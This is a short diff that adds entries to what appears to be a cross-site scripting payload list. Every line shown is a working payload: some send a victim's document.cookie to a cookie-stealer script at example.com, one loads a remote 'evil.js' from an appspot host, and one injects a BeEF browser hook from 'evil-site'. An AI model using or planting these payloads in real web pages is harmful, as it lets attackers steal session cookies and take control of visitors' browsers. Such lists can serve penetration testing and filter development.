@@ -21,3 +21,12 @@ document.write("<img src=http://example.com/cookie-stealer.php?cookie="+ escape(
 <script>
 frames["XSS"].location.href="http://example.com/cookie-stealer.php?cookie=" + document.cookie;
 </script>
+
+<img src="https://www.google.com/favicon.ico" onload="src='http://example.com/'+document.cookie" >
+
+<img src=1 onerror="s=document.createElement('script');s.src='//xss-doc.appspot.com/static/evil.js';document.body.appendChild(s);"
+****this is not testing yet ********
+
+
+<img onload="var s = document.createElement('script'); s.src='http://evil-site/beef/hook/beefmagic.js.php';document.getElementsByTagName('head')[0].appendChild(s);" src="real_image.jpg" />
+****this is not testing yet ********
